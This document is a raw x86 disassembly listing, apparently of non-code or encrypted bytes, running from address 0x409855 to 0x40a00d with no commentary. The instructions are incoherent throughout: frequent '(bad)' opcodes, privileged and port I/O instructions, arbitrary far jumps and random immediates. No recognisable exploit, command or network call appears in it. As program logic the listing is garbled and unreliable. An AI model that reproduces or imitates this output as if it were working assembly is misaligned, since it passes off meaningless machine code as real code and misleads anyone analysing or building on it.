  409855:	arpl   bx,bx
  409857:	inc    edx
  409858:	sti    
  409859:	pop    ebx
  40985a:	jo     0x4098c2
  40985c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40985d:	sbb    BYTE PTR [ebx+0x73],dl
  409860:	pop    ds
  409861:	mov    esi,0xf8cc62d7
  409866:	push   esi
  409867:	xchg   esi,eax
  409868:	loopne 0x40980a
  40986a:	inc    ebx
  40986b:	int    0x73
  40986d:	ss jg  0x40988b
  409870:	or     eax,0x25472e6e
  409875:	sahf   
  409876:	pop    ebx
  409877:	shl    BYTE PTR [edx-0x55],0xda
  40987b:	fidivr WORD PTR [eax]
  40987d:	and    al,0x1
  40987f:	jmp    FWORD PTR [eax-0xd]
  409882:	call   0x91b9:0x66baad7f
  409889:	iret   
  40988a:	rcl    ah,cl
  40988c:	and    al,BYTE PTR [ebp+0x721517b]
  409892:	lahf   
  409893:	(bad)  
  409894:	adc    edi,edi
  409896:	push   ecx
  409897:	xchg   edx,eax
  409898:	fistp  QWORD PTR [edx+0x5d8dc946]
  40989e:	push   esp
  40989f:	mov    esp,0x86bf3a74
  4098a4:	inc    edx
  4098a5:	or     eax,0x290d8fab
  4098aa:	imul   ebp,DWORD PTR [ebp+0x35],0xffffff8d
  4098ae:	loop   0x409890
  4098b0:	loope  0x4098d0
  4098b2:	push   edx
  4098b3:	shl    BYTE PTR [ebp+ecx*2+0x34],0x71
  4098b8:	out    dx,al
  4098b9:	call   0x5cfa9d03
  4098be:	push   edi
  4098bf:	adc    bh,BYTE PTR [edi+0x2e5f3fd5]
  4098c5:	jne    0x409880
  4098c7:	ja     0x4098e2
  4098c9:	push   ecx
  4098ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098cb:	inc    BYTE PTR [edi-0x67]
  4098ce:	hlt    
  4098cf:	fidiv  WORD PTR [edx+0x7eb402e4]
  4098d5:	sbb    eax,DWORD PTR fs:[ecx]
  4098d8:	lds    eax,FWORD PTR [edx]
  4098da:	inc    edi
  4098db:	xchg   esi,eax
  4098dc:	cmp    BYTE PTR [ebp+esi*8+0x21],bl
  4098e0:	test   eax,edi
  4098e2:	data16 loopne 0x4098bd
  4098e5:	add    edi,edx
  4098e7:	popa   
  4098e8:	mov    BYTE PTR [ebx+0x2d],bl
  4098eb:	jbe    0x4098b2
  4098ed:	adc    eax,0xc0feb08a
  4098f2:	test   DWORD PTR gs:[ebx-0x2f670b62],0xb28b9b70
  4098fd:	adc    dl,BYTE PTR [ecx]
  4098ff:	cmp    al,0xe2
  409901:	mov    dl,0x37
  409903:	jp     0x409921
  409905:	stos   DWORD PTR es:[edi],eax
  409906:	cmp    ah,BYTE PTR [ebx+0x32]
  409909:	mov    ebx,0x2b1e30a6
  40990e:	in     al,0xa8
  409910:	mov    esp,0x5aeb2269
  409915:	xor    al,0x4b
  409917:	jnp    0x40993c
  409919:	pop    ecx
  40991a:	and    BYTE PTR [esi],al
  40991c:	xor    esp,DWORD PTR [edi+0x3e061ae]
  409922:	xchg   ebx,eax
  409923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409924:	pop    esp
  409925:	stos   BYTE PTR es:[edi],al
  409926:	sbb    DWORD PTR [ecx-0x11],eax
  409929:	lods   al,BYTE PTR ds:[esi]
  40992a:	push   edi
  40992b:	sub    esp,ecx
  40992d:	cli    
  40992e:	cs in  eax,0x10
  409931:	out    0xed,eax
  409933:	adc    ch,bh
  409935:	and    ebp,DWORD PTR [ecx+0x511ff529]
  40993b:	(bad)  [ebx-0x527c92e9]
  409941:	enter  0x217c,0x88
  409945:	mov    ds:0xe7314dc2,al
  40994a:	mov    WORD PTR [edi+eax*1],ds
  40994d:	lods   eax,DWORD PTR ds:[esi]
  40994e:	mov    edi,DWORD PTR [esi+edi*8+0x1b]
  409952:	ins    BYTE PTR es:[edi],dx
  409953:	jp     0x409977
  409955:	adc    ch,BYTE PTR [ebp+eax*8-0x7ab230a2]
  40995c:	test   BYTE PTR [edx+ecx*4+0x5],0x64
  409961:	xchg   ebp,eax
  409962:	xchg   ebp,eax
  409963:	xchg   ebp,eax
  409964:	pusha  
  409965:	cld    
  409966:	stc    
  409967:	push   eax
  409968:	scas   eax,DWORD PTR es:[edi]
  409969:	adc    esp,DWORD PTR [ebx-0x62]
  40996c:	push   edi
  40996d:	test   eax,0x4ac83bbf
  409972:	jns    0x4099c1
  409974:	(bad)  
  409975:	sbb    bl,BYTE PTR [ebx+edx*2]
  409978:	test   DWORD PTR [esi+0x3b],0x4304a99d
  40997f:	jns    0x4099a6
  409981:	add    eax,0x69eb78f9
  409986:	mov    ebx,0xebfa9c38
  40998b:	cvtps2pd xmm0,QWORD PTR [ebp-0x60]
  40998f:	xchg   edx,eax
  409990:	fucom  st(4)
  409992:	sar    BYTE PTR [ebx-0x6f5d1a20],cl
  409998:	sub    bh,bl
  40999a:	cmp    eax,0xc3bf43e0
  40999f:	jp     0x4099ce
  4099a1:	or     BYTE PTR [esi-0x2e66dfcb],0x20
  4099a8:	jecxz  0x409941
  4099aa:	adc    BYTE PTR [edx],0xed
  4099ad:	pushf  
  4099ae:	es js  0x4099cb
  4099b1:	retf   
  4099b2:	pop    eax
  4099b3:	jmp    0x1491ef10
  4099b8:	rcr    DWORD PTR [edi-0x76845f4c],0xd5
  4099bf:	leave  
  4099c0:	hlt    
  4099c1:	dec    ebp
  4099c2:	(bad)  
  4099c4:	mov    dh,0xf5
  4099c6:	shl    esi,cl
  4099c8:	push   ds
  4099c9:	inc    esi
  4099ca:	retf   0xfa1c
  4099cd:	sahf   
  4099ce:	popf   
  4099cf:	sub    dl,BYTE PTR [eax-0x4dbb8354]
  4099d5:	in     eax,dx
  4099d6:	xchg   ebp,eax
  4099d7:	leave  
  4099d8:	sar    BYTE PTR [ecx+esi*2+0x7123fcb6],1
  4099df:	or     edx,DWORD PTR [eax+0x4]
  4099e2:	repz leave 
  4099e4:	fcomp  DWORD PTR [ebp+0x52]
  4099e7:	stos   DWORD PTR es:[edi],eax
  4099e8:	xor    dl,BYTE PTR [ebp-0x218e282]
  4099ee:	cmp    ah,BYTE PTR [edx+0x39]
  4099f1:	sar    DWORD PTR [ecx],0xe2
  4099f4:	or     al,0xbc
  4099f6:	dec    esp
  4099f7:	mov    eax,0x8e53fb83
  4099fc:	jle    0x409a1f
  4099fe:	sbb    eax,0x75724988
  409a03:	dec    edi
  409a04:	lods   al,BYTE PTR ds:[esi]
  409a05:	xor    eax,DWORD PTR [edx+0x75a21468]
  409a0b:	loope  0x409a19
  409a0d:	add    edx,DWORD PTR [ebx-0x50]
  409a10:	sbb    BYTE PTR ds:0x7693e179,bl
  409a16:	push   cs
  409a17:	mov    edi,0x4c663cec
  409a1c:	repz cmp ah,BYTE PTR [eax+0x63a24e7]
  409a23:	and    al,0x96
  409a25:	dec    eax
  409a26:	pusha  
  409a27:	cdq    
  409a28:	imul   esp,ecx,0x5d95af13
  409a2e:	adc    al,0xfa
  409a30:	mov    edx,0x121634
  409a35:	push   cs
  409a36:	jne    0x4099c4
  409a38:	and    bl,ch
  409a3a:	jle    0x409a3a
  409a3c:	aas    
  409a3d:	xor    ebx,eax
  409a3f:	out    dx,al
  409a40:	adc    al,0x32
  409a42:	fistp  QWORD PTR [ecx-0x5d8d2b7f]
  409a48:	jns    0x409a00
  409a4a:	icebp  
  409a4b:	std    
  409a4c:	jle    0x409aa5
  409a4e:	push   esi
  409a4f:	mov    esp,0xfe09cc69
  409a54:	pop    ecx
  409a55:	push   cs
  409a56:	gs jl  0x409a7e
  409a59:	push   cs
  409a5a:	inc    ebx
  409a5b:	js     0x409aa5
  409a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a5e:	out    dx,eax
  409a5f:	adc    edi,ecx
  409a61:	push   edx
  409a62:	lock push ebp
  409a64:	sub    BYTE PTR fs:[ebx+0x1758fa3b],dl
  409a6b:	dec    ebp
  409a6c:	fwait
  409a6d:	sub    eax,0x63ce80dc
  409a72:	sub    al,0x9a
  409a74:	cmp    ch,BYTE PTR [edx+0x16]
  409a77:	and    DWORD PTR [ecx],0x7f
  409a7a:	sahf   
  409a7b:	sahf   
  409a7c:	cmp    ebp,DWORD PTR [edi+0x6af05d82]
  409a82:	lods   al,BYTE PTR ds:[esi]
  409a83:	fcmovu st,st(4)
  409a85:	and    ah,BYTE PTR [ebp+0xbbebb1f]
  409a8b:	lock xlat BYTE PTR ds:[ebx]
  409a8d:	js     0x409a9c
  409a8f:	mov    eax,0xcd612938
  409a94:	push   0x2d
  409a96:	shr    edx,cl
  409a98:	mov    cl,BYTE PTR [eax]
  409a9a:	mov    dl,0x3a
  409a9c:	int3   
  409a9d:	pop    eax
  409a9e:	xchg   esp,eax
  409a9f:	in     eax,dx
  409aa0:	cmp    bl,BYTE PTR ds:[ebp+0x70]
  409aa4:	lock or BYTE PTR [eax+0x39],dl
  409aa8:	ja     0x409a58
  409aaa:	mov    bl,0xd0
  409aac:	mov    esp,0x4d610ee1
  409ab1:	jp     0x409ae6
  409ab3:	mov    dl,0x29
  409ab5:	aaa    
  409ab6:	stos   BYTE PTR es:[edi],al
  409ab7:	jnp    0x409a4c
  409ab9:	clc    
  409aba:	lods   eax,DWORD PTR ds:[esi]
  409abb:	pop    ds
  409abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409abd:	clc    
  409abe:	cmp    al,0x58
  409ac0:	mov    dh,0xcd
  409ac2:	aas    
  409ac3:	pop    ebx
  409ac4:	add    eax,DWORD PTR [eax-0x589bb80f]
  409aca:	ins    DWORD PTR es:[edi],dx
  409acb:	leave  
  409acc:	loop   0x409aba
  409ace:	sbb    ebx,esp
  409ad0:	clc    
  409ad1:	jmp    0xd3e5:0x373a7163
  409ad8:	pusha  
  409ad9:	repnz (bad) 
  409adb:	lods   al,BYTE PTR ds:[esi]
  409adc:	pop    eax
  409add:	in     eax,0x38
  409adf:	imul   esp,DWORD PTR [ecx],0xe7523b8
  409ae5:	adc    eax,0xac7cead3
  409aea:	dec    esi
  409aeb:	adc    BYTE PTR [ecx],0x7e
  409aee:	adc    ax,0xa6a1
  409af2:	ret    0x4ddd
  409af5:	mov    edi,0x93c3d3e0
  409afa:	adc    al,0xc7
  409afc:	div    DWORD PTR [esi-0x4421307c]
  409b02:	(bad)  
  409b03:	icebp  
  409b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b05:	cmp    BYTE PTR [ecx-0x3b],bl
  409b08:	jmp    0x1a45b6d9
  409b0d:	xchg   ecx,eax
  409b0e:	adc    BYTE PTR [edi-0x75],0x8c
  409b12:	clc    
  409b13:	jmp    0x409abb
  409b15:	jnp    0x409ab4
  409b17:	std    
  409b18:	fdiv   QWORD PTR [edi-0x71]
  409b1b:	jl     0x409af5
  409b1d:	inc    ebx
  409b1e:	mov    ecx,DWORD PTR [esp+esi*4-0x66]
  409b22:	mov    bl,0xfe
  409b24:	sub    DWORD PTR [eax+edi*4],0xffffffd5
  409b28:	es pop ds
  409b2a:	loop   0x409b46
  409b2c:	push   edx
  409b2d:	pop    edi
  409b2e:	(bad)  
  409b2f:	fninit 
  409b31:	and    ebx,DWORD PTR [ecx-0x64]
  409b34:	in     eax,0x80
  409b36:	in     eax,0x7f
  409b38:	inc    ebx
  409b39:	mov    bh,0x16
  409b3b:	push   esp
  409b3c:	clc    
  409b3d:	test   eax,0x326adaeb
  409b42:	pop    edi
  409b43:	sub    al,0x45
  409b45:	je     0x409b8e
  409b47:	ins    BYTE PTR es:[edi],dx
  409b48:	test   DWORD PTR [esi+0x5411f0ae],ecx
  409b4e:	add    BYTE PTR [ecx-0x5cfe2adb],dh
  409b54:	cmp    ecx,DWORD PTR [eax]
  409b56:	xchg   ebp,eax
  409b57:	mov    cl,0xec
  409b59:	mov    bh,0x2a
  409b5b:	xlat   BYTE PTR ds:[ebx]
  409b5c:	call   0x72bb00cf
  409b61:	jecxz  0x409bd2
  409b63:	jp     0x409bd8
  409b65:	inc    BYTE PTR [ebp+ebp*4-0x39]
  409b69:	scas   eax,DWORD PTR es:[edi]
  409b6a:	jg     0x409b52
  409b6c:	inc    ebp
  409b6d:	ins    DWORD PTR es:[edi],dx
  409b6e:	dec    edi
  409b6f:	xor    al,0x90
  409b71:	xor    bh,BYTE PTR [ebp+0xcb821b8]
  409b77:	pop    es
  409b78:	and    ecx,edx
  409b7a:	pushf  
  409b7b:	mov    ds:0xb435f2b3,eax
  409b80:	ss jno 0x409b0a
  409b83:	clc    
  409b84:	fsub   QWORD PTR [ecx+edi*2]
  409b87:	sub    eax,0xb7642a2
  409b8c:	in     al,dx
  409b8d:	mov    WORD PTR [ebx+0x41],es
  409b90:	cmp    bh,bl
  409b92:	dec    edx
  409b93:	add    cl,BYTE PTR [ebx-0x34]
  409b96:	mov    BYTE PTR [ebp+0x2025c83a],cl
  409b9c:	fstp   TBYTE PTR [edi]
  409b9e:	(bad)  [edx-0x1c]
  409ba1:	or     eax,DWORD PTR [esi+edi*2]
  409ba4:	fbld   TBYTE PTR [edi+esi*1-0x42e44a]
  409bab:	xor    esp,ebp
  409bad:	(bad)  
  409bae:	mov    ds:0xcc5b8ec3,al
  409bb3:	test   eax,0xe77f6b8d
  409bb8:	cli    
  409bb9:	push   0xffffffb6
  409bbb:	leave  
  409bbc:	inc    esp
  409bbd:	xchg   BYTE PTR [eax+0x71],ch
  409bc0:	clc    
  409bc1:	mov    ds:0x36576b8e,al
  409bc6:	lahf   
  409bc7:	cmp    al,0xb9
  409bc9:	inc    ebp
  409bca:	jg     0x409c06
  409bcc:	imul   eax,ebx,0xffffffe1
  409bcf:	sbb    DWORD PTR [edx-0x76e789ae],esi
  409bd5:	inc    ebx
  409bd6:	push   esp
  409bd7:	cmp    eax,0xd6cecb9e
  409bdc:	mov    bh,0x17
  409bde:	daa    
  409bdf:	shl    BYTE PTR [esp+edx*8+0x210ece76],1
  409be6:	push   0x8
  409be8:	xchg   ecx,eax
  409be9:	push   ebx
  409bea:	xchg   DWORD PTR ds:0xda1f6e9,edx
  409bf0:	xchg   esi,eax
  409bf1:	in     al,0x33
  409bf3:	test   DWORD PTR [edi-0x4a],0x6c26f6e4
  409bfa:	mov    eax,ds:0x9699a7d3
  409bff:	nop
  409c00:	dec    esp
  409c01:	ins    BYTE PTR es:[edi],dx
  409c02:	jg     0x409c66
  409c04:	shl    BYTE PTR [ecx-0x2358e491],cl
  409c0a:	adc    BYTE PTR [esi],al
  409c0c:	lds    ebp,FWORD PTR [ecx+0x2766748e]
  409c12:	aaa    
  409c13:	and    BYTE PTR [esp+ecx*2],bl
  409c16:	push   0x29fd518c
  409c1b:	imul   ebx,DWORD PTR [eax],0xab3b8e48
  409c21:	cli    
  409c22:	and    ebx,esi
  409c24:	mov    esi,eax
  409c26:	sbb    edx,DWORD PTR [eax]
  409c28:	dec    ebx
  409c29:	in     al,dx
  409c2a:	fadd   DWORD PTR [ebp+0x7]
  409c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c2e:	add    DWORD PTR [edi-0x19],edx
  409c31:	sub    BYTE PTR [ecx+0x10810a5b],al
  409c37:	rcl    DWORD PTR [ebx-0x71],0xe
  409c3b:	in     al,0x76
  409c3d:	push   ds
  409c3e:	stos   BYTE PTR es:[edi],al
  409c3f:	lds    eax,FWORD PTR [ebx-0x71ff6d06]
  409c45:	shl    BYTE PTR [edi-0x50925946],0x60
  409c4c:	mov    ebp,0x9f1f74da
  409c51:	mov    BYTE PTR ds:0x30b26c44,bh
  409c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c58:	nop
  409c59:	mov    ecx,0x3403deed
  409c5e:	ins    BYTE PTR es:[edi],dx
  409c5f:	and    DWORD PTR [eax+ebx*1-0x5b],0x95ac8cd
  409c67:	aad    0xc1
  409c69:	mov    edx,0x8558487b
  409c6e:	aam    0x37
  409c70:	outs   dx,DWORD PTR ds:[esi]
  409c71:	xchg   ebp,eax
  409c72:	call   0x97f6:0x755cabd1
  409c79:	ror    esp,cl
  409c7b:	add    DWORD PTR [eax],0x1e
  409c7e:	shufps xmm5,xmm2,0x1
  409c82:	loop   0x409c23
  409c84:	repz fcomp DWORD PTR [edi]
  409c87:	stc    
  409c88:	jg     0x409cd0
  409c8a:	ret    
  409c8b:	dec    esi
  409c8c:	loope  0x409cd0
  409c8e:	lods   al,BYTE PTR ds:[esi]
  409c8f:	in     al,dx
  409c90:	mov    ebp,0x5e172140
  409c95:	or     DWORD PTR gs:[esi-0x33],eax
  409c99:	leave  
  409c9a:	jno    0x409cf6
  409c9c:	xchg   edx,eax
  409c9d:	inc    BYTE PTR [ecx-0x7f]
  409ca0:	shl    DWORD PTR [eax],0xbc
  409ca3:	push   cs
  409ca4:	shr    DWORD PTR [ebp+0x3b],1
  409ca7:	push   edi
  409ca8:	out    dx,al
  409ca9:	loop   0x409c90
  409cab:	mov    ecx,0x511519b5
  409cb0:	loop   0x409d1b
  409cb2:	jmp    0xc3e8:0xb003fb94
  409cb9:	inc    esi
  409cba:	mov    eax,0x336c78ef
  409cbf:	mov    dl,0xf7
  409cc1:	dec    edx
  409cc2:	mov    BYTE PTR [eax],bh
  409cc4:	ret    0xb817
  409cc7:	adc    al,0xf6
  409cc9:	dec    edi
  409cca:	arpl   WORD PTR [ecx-0x17517130],bp
  409cd0:	push   ebp
  409cd1:	aas    
  409cd2:	fwait
  409cd3:	ss xchg ebx,eax
  409cd5:	dec    eax
  409cd6:	sbb    al,0xe1
  409cd8:	adc    BYTE PTR [eax+0x3e],dl
  409cdb:	fucom  st(3)
  409cdd:	mov    DWORD PTR [ebx],edi
  409cdf:	jmp    0x87868f9e
  409ce4:	jbe    0x409d58
  409ce6:	(bad)  
  409ce8:	test   eax,0xd3cdbe94
  409ced:	adc    BYTE PTR [ebx+0x66],dl
  409cf0:	nop
  409cf1:	enter  0xbd92,0xba
  409cf5:	or     BYTE PTR [ecx+edi*8-0x68],bl
  409cf9:	push   ebx
  409cfa:	push   0x48
  409cfc:	pop    ecx
  409cfd:	pop    ebp
  409cfe:	stos   BYTE PTR es:[edi],al
  409cff:	icebp  
  409d00:	mov    ebp,0xa051c270
  409d05:	or     eax,0x16886e3
  409d0a:	mov    eax,ds:0xe1531a77
  409d0f:	sub    ebp,edx
  409d11:	(bad)  
  409d12:	mov    edi,0x1e4b4db9
  409d17:	(bad)  
  409d18:	jae    0x409ca7
  409d1a:	pop    ecx
  409d1b:	mov    DWORD PTR [eax],esp
  409d1d:	or     ecx,esp
  409d1f:	jns    0x409d54
  409d21:	mov    al,ds:0xbfc1ff54
  409d26:	out    0xea,eax
  409d28:	mov    ecx,0x2ceebc5a
  409d2d:	in     al,0x2f
  409d2f:	jns    0x409d4d
  409d31:	es dec eax
  409d33:	daa    
  409d34:	imul   ecx,DWORD PTR [eax],0xb2428336
  409d3a:	add    al,0xab
  409d3c:	cwde   
  409d3d:	sub    ah,BYTE PTR [ecx+0x6b]
  409d40:	int3   
  409d41:	outs   dx,DWORD PTR ds:[esi]
  409d42:	scas   al,BYTE PTR es:[di]
  409d44:	fild   WORD PTR [esi+0x77]
  409d47:	cmp    bh,ah
  409d49:	dec    ecx
  409d4a:	sub    ecx,DWORD PTR [eax+0x4d135016]
  409d50:	test   DWORD PTR [ecx+0x3435c003],ebx
  409d56:	pusha  
  409d57:	fisubr DWORD PTR [esi-0x264cf95f]
  409d5d:	rcr    DWORD PTR [ecx+esi*4+0x76a92ced],cl
  409d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d65:	sub    DWORD PTR [ebp+0x27758196],edx
  409d6b:	pop    edi
  409d6c:	stos   DWORD PTR es:[edi],eax
  409d6d:	fwait
  409d6e:	inc    edi
  409d6f:	(bad)  
  409d70:	std    
  409d71:	dec    al
  409d73:	adc    bl,BYTE PTR [eax]
  409d75:	mov    esi,0xddf84287
  409d7a:	jle    0x409dc9
  409d7c:	fdivr  st(5),st
  409d7e:	jge    0x409dbe
  409d80:	or     DWORD PTR [ebp+0x6117a060],0x4d965a0d
  409d8a:	sti    
  409d8b:	pop    ecx
  409d8c:	es pop edx
  409d8e:	test   DWORD PTR [ebx],0x1dc5f28c
  409d94:	push   ebx
  409d95:	xchg   ebx,eax
  409d96:	inc    eax
  409d97:	add    al,0x93
  409d99:	add    BYTE PTR [esi-0x35],dh
  409d9c:	retf   0x4404
  409d9f:	and    esi,DWORD PTR [ecx-0x1e]
  409da2:	ins    BYTE PTR es:[edi],dx
  409da3:	out    0x3e,eax
  409da5:	ds dec ecx
  409da7:	add    al,0x8e
  409da9:	sub    edx,DWORD PTR [edx+0x221a6612]
  409daf:	sub    eax,0xc387a9f5
  409db4:	mov    ecx,0x98021fb7
  409db9:	fwait
  409dba:	mov    esi,0xffc6e1ed
  409dbf:	or     BYTE PTR [eax-0x14cc8bf2],dh
  409dc5:	add    esp,DWORD PTR [ebp+0x111435dd]
  409dcb:	sbb    dl,cl
  409dcd:	xchg   edi,eax
  409dce:	cmp    esp,DWORD PTR [ecx+eax*2-0x2162354b]
  409dd5:	mov    dh,0x9c
  409dd7:	and    cl,BYTE PTR [ebp+0x33]
  409dda:	adc    al,0x71
  409ddc:	sti    
  409ddd:	scas   eax,DWORD PTR es:[edi]
  409dde:	add    DWORD PTR ds:0xa2a5e138,ecx
  409de4:	adc    al,0xe5
  409de6:	jecxz  0x409dca
  409de8:	(bad)  [edi+edx*4+0x60bed97e]
  409def:	pop    ebx
  409df0:	lds    edx,FWORD PTR [ecx]
  409df2:	mov    ebp,0xc1cc1d60
  409df7:	push   ecx
  409df8:	mov    ah,0x86
  409dfa:	xchg   ebp,eax
  409dfb:	retf   0x2afd
  409dfe:	mov    al,0x3e
  409e00:	and    al,0xaa
  409e02:	lods   eax,DWORD PTR ds:[esi]
  409e03:	(bad)  
  409e04:	pop    ds
  409e05:	dec    ebx
  409e06:	inc    ecx
  409e07:	mov    bh,0x43
  409e09:	and    esp,edi
  409e0b:	js     0x409dc7
  409e0d:	nop
  409e0e:	pop    esi
  409e0f:	(bad)  
  409e11:	xchg   DWORD PTR [esi],esi
  409e13:	(bad)  
  409e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e17:	mov    ch,0x9f
  409e19:	fwait
  409e1a:	les    ebx,FWORD PTR [edi+0x3cff9e88]
  409e20:	jl     0x409db7
  409e22:	sbb    ch,BYTE PTR ds:0x34d905db
  409e28:	dec    ebp
  409e29:	dec    edi
  409e2a:	add    esp,DWORD PTR [edi]
  409e2c:	cmp    ah,BYTE PTR [edx+eax*1-0x6168273f]
  409e33:	mov    bh,0xc3
  409e35:	icebp  
  409e36:	dec    esp
  409e37:	sub    al,0xe2
  409e39:	push   ds
  409e3a:	pop    ss
  409e3b:	inc    edi
  409e3c:	mov    esi,0x8ea3dc31
  409e41:	add    edi,eax
  409e43:	jb     0x409de5
  409e45:	mov    ?,WORD PTR [ebx+edi*1]
  409e48:	jmp    0x693d:0x17a9d1b2
  409e4f:	lahf   
  409e50:	add    edx,DWORD PTR [edx-0x2e]
  409e53:	pop    ds
  409e54:	nop
  409e55:	paddb  mm7,mm7
  409e58:	lods   al,BYTE PTR ds:[esi]
  409e59:	pop    esp
  409e5a:	frstor [edx+0x10]
  409e5d:	fdiv   DWORD PTR [edi]
  409e5f:	popf   
  409e60:	sbb    DWORD PTR [ebx],ecx
  409e62:	add    BYTE PTR [esi],bl
  409e64:	mov    dh,0xb3
  409e66:	sub    BYTE PTR [esi-0x2],al
  409e69:	(bad)  
  409e6a:	cmc    
  409e6b:	repnz dec edi
  409e6d:	pop    edx
  409e6e:	lahf   
  409e6f:	jle    0x409eb8
  409e71:	dec    eax
  409e72:	ds jmp 0xaf8a:0x5192a2b7
  409e7a:	adc    al,0xe3
  409e7c:	mov    ebp,0x965c9ff5
  409e81:	test   dh,ah
  409e83:	mov    edx,0x98290464
  409e88:	fistp  DWORD PTR [edx+0x3d]
  409e8b:	jb     0x409e89
  409e8d:	push   eax
  409e8e:	(bad)  
  409e8f:	jp     0x409e55
  409e91:	sti    
  409e92:	fldcw  WORD PTR ds:0x991099ac
  409e98:	bound  ebx,QWORD PTR [ecx]
  409e9a:	sbb    ecx,ebp
  409e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e9d:	in     eax,dx
  409e9e:	mov    esi,0x659314c7
  409ea3:	ins    DWORD PTR es:[edi],dx
  409ea4:	push   esp
  409ea5:	cmp    BYTE PTR [ecx],ah
  409ea7:	shr    DWORD PTR [edi-0x7a890ffc],0x28
  409eae:	inc    ebp
  409eaf:	sub    al,0xfc
  409eb1:	popf   
  409eb2:	adc    ch,BYTE PTR [edi+0x29e4d4f2]
  409eb8:	div    DWORD PTR [edi-0x39]
  409ebb:	pusha  
  409ebc:	xlat   BYTE PTR ds:[ebx]
  409ebd:	inc    ebp
  409ebe:	fistp  QWORD PTR [esi]
  409ec0:	ret    
  409ec1:	ss pushf 
  409ec3:	push   ebx
  409ec4:	sbb    dl,bh
  409ec6:	jmp    0xa227:0x4d4d3ef8
  409ecd:	sbb    dl,BYTE PTR [ebx+0x75]
  409ed0:	xchg   BYTE PTR [ecx+0x26],al
  409ed3:	int    0x31
  409ed5:	jnp    0x409ea0
  409ed7:	xchg   edi,eax
  409ed8:	addr16 xchg edi,eax
  409eda:	fwait
  409edb:	pop    edi
  409edc:	lock inc bh
  409edf:	pop    ss
  409ee0:	rcr    DWORD PTR [edx-0x6a],cl
  409ee3:	cwde   
  409ee4:	out    dx,al
  409ee5:	test   dh,bh
  409ee7:	add    eax,0x4ff8a57d
  409eed:	push   0xe2b0d3ae
  409ef2:	fnstenv [edx-0x38]
  409ef5:	int3   
  409ef6:	(bad)
  409ef9:	aas    
  409efa:	xchg   esi,ebp
  409efc:	push   edx
  409efd:	mov    eax,ds:0xc5ee8bc9
  409f02:	pop    ebp
  409f03:	retf   
  409f04:	dec    ebp
  409f05:	cmc    
  409f06:	push   ss
  409f07:	jmp    0xb3f2:0xd4c9d3ed
  409f0e:	mov    cl,0x4e
  409f10:	sub    al,BYTE PTR [eax+0x10b2843e]
  409f16:	or     bl,BYTE PTR [ebx]
  409f18:	test   bl,cl
  409f1a:	or     eax,0xc9bb9a76
  409f1f:	push   ebp
  409f20:	and    BYTE PTR [ebp-0x7f3084aa],bh
  409f26:	out    dx,eax
  409f27:	push   edx
  409f28:	bnd jp 0x409f94
  409f2b:	stc    
  409f2c:	sbb    edx,DWORD PTR [eax-0xd]
  409f2f:	jle    0x409f40
  409f31:	jle    0x409ee2
  409f33:	fwait
  409f34:	xor    ch,BYTE PTR [edx-0x13787bb7]
  409f3a:	dec    ecx
  409f3b:	aad    0xf3
  409f3d:	nop
  409f3e:	sbb    BYTE PTR [edx+eax*4],0x2c
  409f42:	dec    esi
  409f43:	repz aad 0x6f
  409f46:	jmp    0x409f06
  409f48:	mov    al,0x78
  409f4a:	mov    ds:0xe9a56201,eax
  409f4f:	cdq    
  409f50:	add    BYTE PTR [ebp-0x43],0xad
  409f54:	out    0x4f,eax
  409f56:	in     eax,dx
  409f57:	push   esi
  409f58:	push   es
  409f59:	pop    esp
  409f5a:	ins    BYTE PTR es:[edi],dx
  409f5b:	cmp    DWORD PTR [esi-0x2f2292f6],ebp
  409f61:	sbb    esi,DWORD PTR [eax]
  409f63:	fld    DWORD PTR [ebp-0x39]
  409f66:	test   eax,0xce7df493
  409f6b:	pop    ebx
  409f6c:	xor    DWORD PTR [edi+0x4b767434],esp
  409f72:	test   al,0x7a
  409f74:	and    ebx,ebp
  409f76:	cli    
  409f77:	cmc    
  409f78:	and    al,0x54
  409f7a:	call   0x2b86:0xb4d85b5b
  409f81:	stos   BYTE PTR es:[edi],al
  409f82:	adc    DWORD PTR [esi+0xb],ebx
  409f85:	cmp    al,0xe9
  409f87:	mov    eax,ds:0xd61127d5
  409f8c:	or     al,0x3a
  409f8e:	add    DWORD PTR [edx],ecx
  409f90:	or     eax,0xa04daea6
  409f95:	cmp    dh,ch
  409f97:	not    BYTE PTR [ebx+0x4]
  409f9a:	jl     0x409f52
  409f9c:	mov    ecx,0xf8a0d0b0
  409fa1:	mov    cl,0xea
  409fa3:	dec    edx
  409fa4:	(bad)  [edi-0x18]
  409fa7:	minps  xmm2,XMMWORD PTR [ebp+0x7524552a]
  409fae:	xor    eax,0xd79ece3f
  409fb3:	in     al,0x9b
  409fb5:	scas   eax,DWORD PTR es:[edi]
  409fb6:	retf   
  409fb7:	add    eax,0xdfbaa29b
  409fbc:	(bad)  
  409fbd:	push   0xffffffa6
  409fbf:	pop    esp
  409fc0:	add    BYTE PTR ds:0xd0d58f27,ch
  409fc6:	pop    ds
  409fc7:	inc    edi
  409fc8:	add    dh,BYTE PTR [ebp+0x5e4b29b7]
  409fce:	(bad)  
  409fcf:	(bad)  [ecx+0x4f]
  409fd2:	sub    ebx,DWORD PTR [esi-0x76]
  409fd5:	fwait
  409fd6:	xor    DWORD PTR [edi+0x7daa6000],eax
  409fdc:	mov    ecx,0x5a33e9cf
  409fe1:	stos   BYTE PTR es:[edi],al
  409fe2:	adc    eax,0xce0ec03f
  409fe7:	inc    edx
  409fe8:	fld    TBYTE PTR [edi-0xbb91c76]
  409fee:	sar    BYTE PTR [ebp-0x52c66207],cl
  409ff4:	cmp    edx,esp
  409ff6:	or     BYTE PTR [edi],al
  409ff8:	mov    eax,ds:0x88bf2ac5
  409ffd:	pop    es
  409ffe:	push   edi
  409fff:	mov    ebx,0xaef27cc1
  40a004:	push   0xffffffa4
  40a006:	in     al,dx
  40a007:	enter  0x3987,0x1d
  40a00b:	cmp    ebx,ebx
  40a00d:	sbb    DWORD PTR [esi-0x45],0xffffffea
